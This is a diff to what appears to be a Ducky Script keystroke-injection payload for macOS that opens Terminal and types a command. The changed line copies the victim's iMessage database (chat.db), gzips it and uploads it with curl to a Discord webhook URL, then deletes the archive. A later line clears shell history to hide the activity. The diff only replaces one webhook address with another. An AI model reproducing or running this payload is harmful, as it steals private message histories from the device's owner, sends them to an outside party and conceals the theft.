@@ -8,7 +8,7 @@ STRING TERMINAL
 ENTER
 DELAY 3000
 REM Work in progress to send the actual sql file. 
-STRING cp ~/Library/Messages/chat.db . && gzip chat.db && curl -F "file1=@chat.db.gz" https://discord.com/api/webhooks/1339362596029202443/7bC0jDlDFUHVbqnMQw82UOZjd5yBXBC2XI_SQOBwW0eEAvk3pnKORvdojL5ceoqUmjkB && rm -r chat.db.gz
+STRING cp ~/Library/Messages/chat.db . && gzip chat.db && curl -F "file1=@chat.db.gz" https://discord.com/api/webhooks/1339384272129097770/HRU1pRfC6XxJUo6FmgC79N0hcaX8b2e5x2CK-f47_83DCwT5GYSvWSXNJUKhod7z4A14 && rm -r chat.db.gz
 ENTER
 DELAY 1500
 STRING history -c
